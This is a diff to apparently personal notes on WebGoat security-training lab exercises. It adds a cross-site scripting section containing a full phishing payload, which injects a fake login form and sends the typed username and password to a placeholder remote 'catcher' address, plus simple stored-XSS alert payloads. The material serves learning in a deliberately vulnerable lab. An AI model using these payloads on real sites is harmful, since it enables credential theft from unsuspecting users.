@@ -99,3 +99,30 @@ Start OWASP Proxy and open a browser (I am using firefox) that is preconfigured 
        the orders. Then purchase the order in cheaper one and confirm the order in the
        expensive one. Do it multiple times and you may get lucky to exploit the
        concurrency vulnerability.
+
+7. Cross-Site Scripting (XSS)
+   7.1 Phishing with XSS
+   A.  Write the following query in the search windows(without quotes):
+        "</form>
+        <script>
+        function hack(){
+        XSSImage=new Image;
+        XSSImage.src="http://xxx.xxx.xxx.xxx:8080/WebGoat/catcher?PROPERTY=yes&user=" + document.phish.user.value + "&password=" + document.phish.pass.value + "";
+        alert("Had this been a real attack... Your credentials were just stolen. User Name = " + document.phish.user.value + " Password = " + document.phish.pass.value);
+        }
+        </script>
+        <form name="phish">
+        <HR>
+        <H2>This feature requires account login:</H2>
+        Enter Username:<input type="text" name="user" ><br>
+        Enter Password: <input type="password" name = "pass"><br>
+        <input type="submit" name="login" value="login" on-click="hack()">"
+       I have got this answer from the solution and I not sure how can this be used as
+       an attack. The query is sent as part of the HTML body and NOT as part of URL.
+       All a user may see is a URL to an page WITHOUT the poisoned query. This attack
+       may work in case where an html code is injected and then the username/password
+       are sent to a remote server.
+   7.2 Stored XSS Attacks:
+   A.  Enter "<script>alert('XSSTitle');</script>" in the title bar and "<script>alert('XSSBody');</script>"
+       in the message body. You will see the title bar pops up.
+   7.3 
